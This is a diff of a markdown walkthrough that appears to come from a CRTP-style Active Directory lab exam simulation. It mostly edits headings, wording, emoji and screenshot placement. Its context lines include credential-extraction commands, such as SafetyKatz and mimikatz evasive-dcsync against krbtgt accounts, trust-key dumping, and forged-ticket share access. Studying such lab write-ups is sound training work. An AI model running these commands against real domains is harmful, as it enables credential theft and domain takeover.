@@ -11,7 +11,7 @@
 	- [x] Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)
 	- [x] Local Privilege Escalation | GPO Abuse (with Impacket's ntlmrelayx, GPOddity)
 - [x] Domain Lateral Movement
-	- [x] Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
+	- [x] Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, RunAs, Find-PSRemotingLocalAdminAccess)
 - [x] Domain Privilege Escalation
 	- [x] Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
 	- [x] Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
@@ -26,7 +26,7 @@
 	- [x] Domain Persistence | Security Descriptors Abuse (with Rubeus, RACE)
 - [x] Cross Trust Attacks
 	- [x] Cross Trust Attacks | Domains Trust Key Abuse (with Rubeus, SafetyKatz)
-	- [x] Cross Trust Attacks | Child `krbtgt` Key Hash Abuse (with Rubeus)
+	- [x] Cross Trust Attacks | Child Domain `krbtgt` Key Hash Abuse (with Rubeus)
 	- [x] Cross Trust Attacks | Forests Trust Key Abuse (with Rubeus, SafetyKatz)
 	- [x] Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
 	- [x] Cross Trust Attacks | SQL Server Links Abuse + Credential Extraction (OPSEC) (with PowerUpSQL, FindLSASSPID, minidumpdotnet, mimikatz, Rubeus, WSManWinRM)
@@ -194,12 +194,6 @@ Name                    : eu.eurocorp.local🏛️
 | eurocorp.local 🏰  | eurocorp.local 🏛️                | -                              | eurocorp-dc.eurocorp.local 🖥️           | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️ (FILTER_SIDS)  |
 | eurocorp.local 🏰  | eu.eurocorp.local 🏛️             | eurocorp.local 🏛️              | -                                       | -                                                                  |
 
-![BloodHound Legacy | Analysis - Find all Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_all_domain_admins.png)
-
-![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)
-
-![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](./assets/screenshots/crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)
-
 #### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
 
 **Domain Enumeration | Users**
@@ -261,7 +255,7 @@ objectclass           : {top, person, organizationalPerson, user}
 displayname           : student422
 lastlogontimestamp    : 3/1/2025 9:13:36 PM
 userprincipalname     : student422@dollarcorp.moneycorp.local
-samaccountname        : student422
+samaccountname        : student422👤
 codepage              : 0
 samaccounttype        : USER_OBJECT
 accountexpires        : NEVER
@@ -279,7 +273,7 @@ usnchanged            : 1561497
 memberof              : CN=RDP Users👥,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
 lastlogon             : 3/3/2025 2:16:11 AM
 badpwdcount           : 2158
-cn                    : student422👤
+cn                    : student422
 useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 objectsid             : S-1-5-21-719815819-3726368948-3917688648-20607
 primarygroupid        : 513
@@ -499,6 +493,12 @@ MemberSID               : S-1-5-21-719815819-3726368948-3917688648-20620
 
 [SNIP]
 ```
+
+![BloodHound Legacy | Analysis - Find all Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_all_domain_admins.png)
+
+![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)
+
+![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](./assets/screenshots/crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)
 
 #### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)
 
@@ -771,8 +771,7 @@ DCORP-CI🖥️
 
 flags                    : 0
 displayname              : Applocker📑
-gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E1
-                           4A0-B4FB-11D0-A0D0-00A0C90F574B}]
+gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
 whenchanged              : 1/6/2025 8:33:19 AM
 versionnumber            : 15
 name                     : {0D1CC23D-1F20-4EEE-AF64-D99597AE2A6E}📑
@@ -825,7 +824,7 @@ Students📑
 DevOps Policy📑
 ```
 
-`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
+`Get-DomainGPO -Identity (Get-DomainOU -Identity 'Applocked').gplink.substring(11,(Get-DomainOU -Identity 'Applocked').gplink.length-72)`:
 ```
 flags                    : 0
 displayname              : Applocker📑
@@ -848,7 +847,7 @@ objectclass              : {top, container, groupPolicyContainer}
 objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
 ```
 
-`Get-DomainGPO -Identity (Get-DomainOU -Identity 'DevOps').gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)`:
+`Get-DomainGPO -Identity (Get-DomainOU -Identity 'DevOps').gplink.substring(11,(Get-DomainOU -Identity 'DevOps').gplink.length-72)`:
 ```
 flags                    : 0
 displayname              : DevOps Policy📑
@@ -1660,7 +1659,7 @@ USERNAME=student422👤
 
 ### Domain Lateral Movement
 
-#### Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
+#### Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, RunAs, Find-PSRemotingLocalAdminAccess)
 
 - **Find a Target Machine 1 `dcorp-mgmt` where a Domain Administrator has an Active Session**
 
@@ -2905,6 +2904,7 @@ Cached Tickets: (1)
 [SNIP]
 
 mimikatz(commandline) # lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local📌
+
 [DC] 'moneycorp.local'🏛️ will be the domain
 [DC] 'mcorp-dc.moneycorp.local' will be the DC server
 [DC] 'mcorp\krbtgt' will be the user account
@@ -2946,7 +2946,7 @@ Supplemental Credentials:
 
 #### Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)
 
-- **Find a Target User where Constrained Delegation is Enabled**
+- **Find a Delegator User where Constrained Delegation is Enabled**
 
 **Constrained Delegation - Users**
 
@@ -3000,7 +3000,7 @@ name                     : web svc
 [SNIP]
 ```
 
-- **Forge an S4U TGS using the Target User TGS Encryption Key Hash for the Service to which Delegation is Configured**
+- **Forge an S4U TGS using the Delegator User AES Encryption Key Hash for the CIFS Service Service Delegation**
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -3061,7 +3061,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-- **Leverage the Forged Ticket to Gain Access to that Service**
+- **Leverage the Forged Ticket to Gain Access to the CIFS Service**
 
 `dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$`:
 ```
@@ -3081,7 +3081,7 @@ Cached Tickets: (1)
 ```
 🚩
 
-- **Find a Target Server where Constrained Delegation is Enabled**
+- **Find a Delegator Server where Constrained Delegation is Enabled**
 
 **Constrained Delegation - Computers**
 
@@ -3137,7 +3137,7 @@ dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local
 [SNIP]
 ```
 
-- **Forge an S4U TGS using the Target Server TGS Encryption Key Hash for the Delegated Service and Leverage it to Obtain an Alternate TGS for the LDAP Service**
+- **Forge an S4U TGS using the Delegator Machine AES Encryption Key Hash for the TIME Service Delegation and Leverage it to Request and Obtain a TGS for the LDAP Service**
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -3200,7 +3200,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC and Gain DA Privileges**
+- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC (Delegatee Server) and Gain DA Privileges**
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
 ```
@@ -4288,7 +4288,6 @@ dcorp-dc🖥️
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
-
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
 [SNIP]
@@ -5326,7 +5325,7 @@ COMPUTERNAME=MCORP-DC🖥️
 ```
 🚩
 
-#### Cross Trust Attacks - Child Domain `krbtgt` Key Hash Abuse
+#### Cross Trust Attacks | Child Domain `krbtgt` Key Hash Abuse
 
 - **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**
 
@@ -5515,7 +5514,7 @@ C:\Users\svcadmin>
 
 mimikatz(commandline) # lsadump::evasive-trust /patch📌
 
-Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648📌)
 
 [SNIP]
 
